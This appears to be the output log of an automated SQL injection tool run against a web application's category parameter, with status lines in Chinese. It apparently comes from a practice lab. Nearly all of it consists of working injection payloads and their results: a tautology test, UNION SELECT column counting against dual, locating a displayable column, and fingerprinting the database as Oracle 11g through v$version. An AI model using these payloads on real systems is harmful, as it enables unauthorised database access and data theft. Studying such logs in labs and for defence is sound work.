```!
[*] 偵測 SQLi
    [Payload] Gifts
    [Payload] ' OR 1=1 -- 
[+] 目標可能存在 SQLi
[*] 偵測欄位數
    [Payload] ' UNION SELECT NULL from dual  --  
    [Payload] ' UNION SELECT NULL,NULL from dual  --  
[+] 欄位數 = 2
[*] 偵測可回顯欄位
    [Payload] ' UNION SELECT 'DISP_COL_TEST',NULL from dual -- 
[+] 可回顯欄位索引 = 1
[*] 偵測 DBMS
    [Payload] ' UNION SELECT banner,NULL FROM v$version -- 
[+] DBMS = Oracle
[*] 取得 DB 版本
    [Payload] ' UNION SELECT banner,NULL FROM v$version -- 
[+] DB Version = Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```